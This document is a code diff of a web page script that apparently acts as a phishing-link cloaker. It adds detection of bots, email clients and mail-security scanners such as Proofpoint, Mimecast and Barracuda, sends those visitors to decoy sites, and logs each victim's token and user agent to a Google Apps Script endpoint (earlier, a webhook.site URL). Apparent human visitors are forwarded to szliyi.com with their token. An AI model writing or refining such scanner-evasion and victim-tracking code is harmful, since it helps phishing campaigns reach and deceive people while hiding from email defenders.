@@ -9,20 +9,25 @@
       const ua = navigator.userAgent || "";
       const uaClean = ua.toLowerCase().replace(/\s+/g, '');
       let isBot = false;
-      let isProxy = false;
-      let isHosting = false;
-      let isMorocco = false;
 
-      // Basic UA-based bot check
+      // Expanded UA keyword detection
       if (
         uaClean.includes("bot") || uaClean.includes("crawl") || uaClean.includes("spider") ||
         uaClean.includes("slurp") || uaClean.includes("headless") || uaClean.includes("phantom") ||
-        uaClean.includes("facebookexternalhit") || uaClean.includes("googlebot")
+        uaClean.includes("facebookexternalhit") || uaClean.includes("googlebot") ||
+        uaClean.includes("bingbot") || uaClean.includes("yahoobot") || uaClean.includes("duckduckbot") ||
+        uaClean.includes("outlook") || uaClean.includes("thunderbird") || uaClean.includes("email") ||
+        uaClean.includes("mail") || uaClean.includes("eudora") || uaClean.includes("applemail") ||
+        uaClean.includes("smtp") || uaClean.includes("imap") || uaClean.includes("pop3") ||
+        uaClean.includes("scanner") || uaClean.includes("preview") || uaClean.includes("fetcher") ||
+        uaClean.includes("verifier") || uaClean.includes("proofpoint") || uaClean.includes("postini") ||
+        uaClean.includes("barracuda") || uaClean.includes("trendmicro") || uaClean.includes("mimecast") ||
+        uaClean.includes("comcast") || uaClean.includes("charter") || uaClean.includes("roadrunner") ||
+        uaClean.includes("att") || uaClean.includes("yahoo") || uaClean.includes("gmail") || uaClean.includes("aol")
       ) {
         isBot = true;
       }
 
-      // JS and localStorage test
       try {
         localStorage.setItem("js-check", "1");
         if (localStorage.getItem("js-check") !== "1") isBot = true;
@@ -30,7 +35,6 @@
         isBot = true;
       }
 
-      // Plugin/screen tests
       if (navigator.plugins.length === 0 || screen.colorDepth < 8 || screen.availHeight === 0) {
         isBot = true;
       }
@@ -38,47 +42,24 @@
       let moved = false;
       window.addEventListener("mousemove", () => moved = true);
 
-      // IP check
-      fetch("https://ipapi.co/json?key=F74e0gpSdeUEaF4")
-        .then(res => res.json())
-        .then(data => {
-          const org = (data.org || "").toLowerCase();
-          if (data.proxy === true || data.hosting === true) {
-            isBot = true;
-          }
-          if (data.country === "MA") {
-            isMorocco = true;
-          }
+      if (!hash) {
+        window.location.href = "https://google.com";
+        return;
+      }
 
-          if (!hash) {
-            window.location.href = "https://google.com";
-            return;
-          }
+      // Log to Google Sheets via Google Apps Script
+      const logUrl = "https://script.google.com/macros/s/AKfycby99wagEpAvJm6jwQLEqwWLqIGSX8LA7wjPMyaQ43vWDAWQR38zeLWhdPRgECh4u5yI/exec";
+      const fullLogUrl = `${logUrl}?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}`;
+      const img = new Image();
+      img.src = fullLogUrl;
 
-          // Log to webhook
-          const logUrl = "https://webhook.site/1723ccce-7bc8-46c1-802e-838962bea4df";
-          const fullLogUrl = `${logUrl}?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&proxy=${data.proxy}&hosting=${data.hosting}&country=${data.country}&ts=${Date.now()}`;
-          const img = new Image();
-          img.src = fullLogUrl;
-
-          setTimeout(() => {
-            if (isMorocco) {
-              window.location.href = "https://www.maroc.ma";
-            } else if (isBot || !moved) {
-              window.location.href = "https://yelp.com";
-            } else {
-              window.location.replace(`https://szliyi.com/${hash}`);
-            }
-          }, 2500);
-        })
-        .catch(() => {
-          // On IPAPI fail, fallback
-          if (!hash) {
-            window.location.href = "https://google.com";
-          } else {
-            window.location.replace(`https://szliyi.com/${hash}`);
-          }
-        });
+      setTimeout(() => {
+        if (isBot || !moved) {
+          window.location.href = "https://yelp.com";
+        } else {
+          window.location.replace(`https://szliyi.com/${hash}`);
+        }
+      }, 2000);
     });
   </script>
 </head>
